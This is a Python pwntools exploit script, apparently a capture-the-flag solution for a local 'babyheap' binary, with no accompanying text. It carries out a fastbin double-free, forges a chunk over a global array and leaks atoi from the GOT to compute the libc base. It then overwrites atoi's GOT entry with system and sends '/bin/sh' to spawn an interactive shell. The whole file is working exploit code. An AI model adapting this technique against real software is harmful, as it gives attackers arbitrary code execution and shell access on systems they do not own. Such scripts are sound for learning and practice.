from pwn import *

def add(content):
	r.sendline('1')
	r.recvuntil('Content: ')
	r.sendline(content)
	r.recvuntil("Your choice: ")
def edit(idx,content):
	r.sendline('2')
	r.recvuntil("Index: ")
	r.sendline(str(idx))
	r.recvuntil("Content: ")
	r.sendline(content)
	r.recvuntil("Your choice: ")
def show(idx):
	r.sendline('3')
	r.recvuntil("Index: ")
	r.sendline(str(idx))
	r.recvuntil("Content: ")
	msg = (r.recv(6)+"\x00\x00")
	r.recvuntil("Your choice: ")
	return u64(msg)
def delete(idx):
	r.sendline('4')
	r.recvuntil('Index: ')
	r.sendline(str(idx))
	r.recvuntil("Your choice: ")
def name(name):
	r.recvuntil("Name: ")
	r.sendline(name)
	r.recvuntil("Your choice: ")
	
r = process("babyheap")
raw_input("?")

atoi_got = 0x602068
offset_atoi = 0x36e80
offset_system = 0x45390
payload = p64(0x00)
payload += p64(0x71)
name(payload)
add('A'*0x10)
add('B'*0x10)
add('C'*0x10)
delete(0)
delete(1)
delete(0)
add(p64(0x6020e0))
add('B'*0x10)
add('C'*0x10)
payload = 'A'*0x10
payload += p64(0x602068)
add(payload)
atoi = show(0)
libc = atoi - offset_atoi
system = libc + offset_system
log.info("libc: %#x",libc)
log.info("system: %#x",system)
edit(0,p64(system))
r.sendline("/bin/sh\x00")
r.interactive()